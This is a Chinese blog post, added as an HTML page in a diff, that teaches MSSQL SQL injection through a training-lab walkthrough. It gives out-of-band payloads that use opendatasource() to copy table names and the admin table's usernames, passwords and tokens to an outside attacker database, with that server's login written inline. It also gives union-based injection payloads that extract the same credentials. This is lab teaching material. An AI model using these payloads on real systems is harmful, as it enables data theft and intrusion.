@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQL注入-反弹注入 MSSQL基础MSSQL是指微软的SQLServer的数据库服务器 每个库都会自带有sysobjects表，其中有三个字段  name 当前数据库下的所有表名 id 相当于表名的标识 xtype 字段 中 U 代表用户创建的表名，S代表系统创建的  每个库都会自带有syscolumns表,其中有两个字段  name 每个表的字段名 id 对应sysobjects表中id字段">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入-反弹注入">
+<meta property="og:url" content="http://example.com/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="kilig&#39;s Blog">
+<meta property="og:description" content="SQL注入-反弹注入 MSSQL基础MSSQL是指微软的SQLServer的数据库服务器 每个库都会自带有sysobjects表，其中有三个字段  name 当前数据库下的所有表名 id 相当于表名的标识 xtype 字段 中 U 代表用户创建的表名，S代表系统创建的  每个库都会自带有syscolumns表,其中有两个字段  name 每个表的字段名 id 对应sysobjects表中id字段">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173024557.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173117458.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173127946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173134513.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173159649.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173211354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173219978.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173226604.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173237828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173834636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173845696.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173857498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041017390864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173926890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173938101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173949632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410173959934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410174119363.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410174100149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041017404595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410174145966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410174157895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2022-11-23T06:50:48.000Z">
+<meta property="article:modified_time" content="2023-03-07T13:29:00.001Z">
+<meta property="article:author" content="kiligwh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210410173024557.png">
+
+
+<link rel="canonical" href="http://example.com/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/","path":"2022/11/23/SQL注入-反弹注入/","title":"SQL注入-反弹注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入-反弹注入 | kilig's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">kilig's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">If it is a rose,it will blossom</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入-反弹注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.</span> <span class="nav-text">MSSQL基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">反弹注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">靶场（反弹注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">使用显错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">1.5.</span> <span class="nav-text">显错注入基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.6.</span> <span class="nav-text">显错注入步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.7.</span> <span class="nav-text">靶场</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kiligwh"
+      src="/images/kilig.gif">
+  <p class="site-author-name" itemprop="name">kiligwh</p>
+  <div class="site-description" itemprop="description">欢迎</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入-反弹注入 | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入-反弹注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-23 14:50:48" itemprop="dateCreated datePublished" datetime="2022-11-23T14:50:48+08:00">2022-11-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:29:00" itemprop="dateModified" datetime="2023-03-07T21:29:00+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="SQL注入-反弹注入"><a href="#SQL注入-反弹注入" class="headerlink" title="SQL注入-反弹注入"></a>SQL注入-反弹注入</h1><hr>
+<h2 id="MSSQL基础"><a href="#MSSQL基础" class="headerlink" title="MSSQL基础"></a>MSSQL基础</h2><p>MSSQL是指微软的SQLServer的数据库服务器</p>
+<p>每个库都会自带有sysobjects表，其中有三个字段</p>
+<ol>
+<li>name 当前数据库下的所有表名</li>
+<li>id 相当于表名的标识</li>
+<li>xtype 字段 中 U 代表用户创建的表名，S代表系统创建的</li>
+</ol>
+<p>每个库都会自带有syscolumns表,其中有两个字段</p>
+<ol>
+<li>name 每个表的字段名</li>
+<li>id 对应sysobjects表中id字段</li>
+</ol>
+<h2 id="反弹注入"><a href="#反弹注入" class="headerlink" title="反弹注入"></a>反弹注入</h2><blockquote>
+<p>原理</p>
+</blockquote>
+<p>将目标站点中查询到的数据结果 传到攻击者的数据库中</p>
+<p>注入条件：网络通畅，攻击者需要有公网ip地址的数据库</p>
+<p>所用函数：opendatasource()<br>将当前数据库查询的结果发送到另外一数据库服务器中</p>
+<p>语法：opendatasource(provider_name,int_string)</p>
+<blockquote>
+<p>公式</p>
+</blockquote>
+<p>insert into opendatasource(‘sqloledb’,’server&#x3D;服务器地址,1433;<br>uid&#x3D;用户名;pwd&#x3D;密码;database&#x3D;数据库名’).数据库名.dbo.表 SQL语句</p>
+<blockquote>
+<p>条件</p>
+</blockquote>
+<p> 网络通常，攻击者需要有公网IP的数据库服务器地址</p>
+<blockquote>
+<p>函数</p>
+</blockquote>
+<p>opendatasource()</p>
+<p>作用：将目标站点查询到的数据结果 传到攻击者的数据库中</p>
+<p>用法：</p>
+<p>opendatasource(‘sqloledb’,’server&#x3D;服务器地址,端口号;uid&#x3D;用户名;pwd&#x3D;密码;database&#x3D;数据库名’)</p>
+<blockquote>
+<p>反弹注入 步骤</p>
+</blockquote>
+<ul>
+<li>需创建用于存放目标站点表名的表，字段有id，name</li>
+<li>构造payload 存放 SQL语句查询到的id和name<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.tb select id,name from sysobjects where xtype=&#39;U&#39; -- q</code></li>
+<li>创建用于存放目标站点表名的字段名的表，字段有id，name</li>
+<li>构造payload<br>存放指定表中的字段名<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.col select id,name from syscolumns where id=1977058079 -- q</code></li>
+<li>根据查到的表名字段名 创建表和字段名</li>
+<li>构造payload得到结果<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.res select id,username,passwd,token from admin -- q</code></li>
+</ul>
+<h2 id="靶场（反弹注入）"><a href="#靶场（反弹注入）" class="headerlink" title="靶场（反弹注入）"></a>靶场（反弹注入）</h2><p>1、创建数据表tb，将查询到的id，name存放在该表中<br><img src="https://img-blog.csdnimg.cn/20210410173024557.png" alt="在这里插入图片描述"></p>
+<p>2、构造payload， 查询表名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(‘sqloledb’,’<span class="keyword">server</span>=SQL5095.site4now.net,<span class="number">1433</span>;uid=DB_14DBE69_zkaq_admin;</span><br><span class="line">pwd=<span class="number">123456789</span>;<span class="keyword">database</span>=DB_14DBE69_zkaq’).DB_14DBE69_zkaq.dbo.tb <span class="keyword">select</span> id,<span class="type">name</span> <span class="keyword">from</span> sysobjects</span><br><span class="line"> <span class="keyword">where</span> xtype=’U’ — q</span><br></pre></td></tr></table></figure>
+
+<p>返回正常<br><img src="https://img-blog.csdnimg.cn/20210410173117458.png" alt="在这里插入图片描述"></p>
+<p>3、查看 tb表 是否有数据<br><img src="https://img-blog.csdnimg.cn/20210410173127946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>4、创建存放admin表中字段的表 col<br><img src="https://img-blog.csdnimg.cn/20210410173134513.png" alt="在这里插入图片描述"></p>
+<p>5、构造payload，查admin表的字段</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(‘sqloledb’,’<span class="keyword">server</span>=SQL5095.site4now.net,<span class="number">1433</span>;uid=DB_14DBE69_zkaq_admin;</span><br><span class="line">pwd=<span class="number">123456789</span>;<span class="keyword">database</span>=DB_14DBE69_zkaq’).DB_14DBE69_zkaq.dbo.col <span class="keyword">select</span> id,<span class="type">name</span> <span class="keyword">from</span> syscolumns</span><br><span class="line"> <span class="keyword">where</span> id=<span class="number">1977058079</span> — q</span><br></pre></td></tr></table></figure>
+
+<p>页面返回正常<br><img src="https://img-blog.csdnimg.cn/20210410173159649.png" alt="在这里插入图片描述"></p>
+<p>6、查看数据库中col表<br><img src="https://img-blog.csdnimg.cn/20210410173211354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>7、得到admin表中字段：id、username、passwd、token<br>创建res表 用于存放admin表中字段信息<br><img src="https://img-blog.csdnimg.cn/20210410173219978.png" alt="在这里插入图片描述"></p>
+<p>8、页面返回正常</p>
+<p><img src="https://img-blog.csdnimg.cn/20210410173226604.png" alt="在这里插入图片描述"></p>
+<p>9、查看res表，得到flag<br><img src="https://img-blog.csdnimg.cn/20210410173237828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="使用显错注入"><a href="#使用显错注入" class="headerlink" title="使用显错注入"></a>使用显错注入</h2><h2 id="显错注入基础"><a href="#显错注入基础" class="headerlink" title="显错注入基础"></a>显错注入基础</h2><ul>
+<li>union 联合查询 去重</li>
+<li>union all 不去重 显示全部数据</li>
+<li>除了MySQL数据库其他数据库查询内容要写全（select 字段 from 表名）</li>
+<li>MySQL在联合查询时对字段数有严格的规定，但是对字段类型规定比较淡</li>
+</ul>
+<h2 id="显错注入步骤"><a href="#显错注入步骤" class="headerlink" title="显错注入步骤"></a>显错注入步骤</h2><ul>
+<li><p>使用sysobjects表中name、id、xtype探测出用户创建了哪些表</p>
+<p>‘ union all select id,name,null from sysobjects where xtype&#x3D;’U’</p>
+</li>
+<li><p>使用syscolumns表探测指定表id的字段名</p>
+<p>‘ union all select id,name,’b’ from syscolumns where id&#x3D;表的id</p>
+</li>
+<li><p>使用selece 直接爆出数据</p>
+<p>select 字段名 from 表名</p>
+</li>
+</ul>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410173834636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2、1后加\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410173845696.png" alt="在这里插入图片描述"></p>
+<p>3、构造闭合 ‘ — q<br><img src="https://img-blog.csdnimg.cn/20210410173857498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>4、使用order by 探测字段数<br>order by 4 报错<br><img src="https://img-blog.csdnimg.cn/2021041017390864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>order by 3 正常<br><img src="https://img-blog.csdnimg.cn/20210410173926890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>字段数为3</p>
+<p>5、使用联合查询<br><img src="https://img-blog.csdnimg.cn/20210410173938101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>加union all 试一试<br><img src="https://img-blog.csdnimg.cn/20210410173949632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>6、猜测表名news<br><img src="https://img-blog.csdnimg.cn/20210410173959934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>7、会不会是 数据类型不对呢，1，2，3全部改为null<br><img src="https://img-blog.csdnimg.cn/20210410174119363.png" alt="在这里插入图片描述"></p>
+<p>8、猜测第一个null是int型，第二ge和第三个是字符型<br><img src="https://img-blog.csdnimg.cn/20210410174100149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>9、通过sysobjects表的id、xtype和name 探测用户创建的表名<br>payload：<br>‘ union all select id,name,’b’ from sysobjects where xtype&#x3D;’U’— q<br><img src="https://img-blog.csdnimg.cn/2021041017404595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>10、探测admin表中的字段，通过syscolumns表中的id和name<br>payload：<br>‘ union all select id,name,’b’ from syscolumns where id&#x3D;1977058079 — q<br><img src="https://img-blog.csdnimg.cn/20210410174145966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>11、查看passwd和token字段数据<br>payload：<br>‘ union all select id,passwd,token from admin — q<br><img src="https://img-blog.csdnimg.cn/20210410174157895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>12、得到flag，通过</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/22/SQL%E6%B3%A8%E5%85%A5-DNSLog%E6%B3%A8%E5%85%A5/" rel="prev" title="SQL注入-DNSLog注入">
+                  <i class="fa fa-chevron-left"></i> SQL注入-DNSLog注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入-Oracle报错注入">
+                  SQL注入-Oracle报错注入 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kiligwh</span>
+</div>
+
+<!-- 删除 “由 Hexo & NexT.Gemini 强力驱动” -->
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
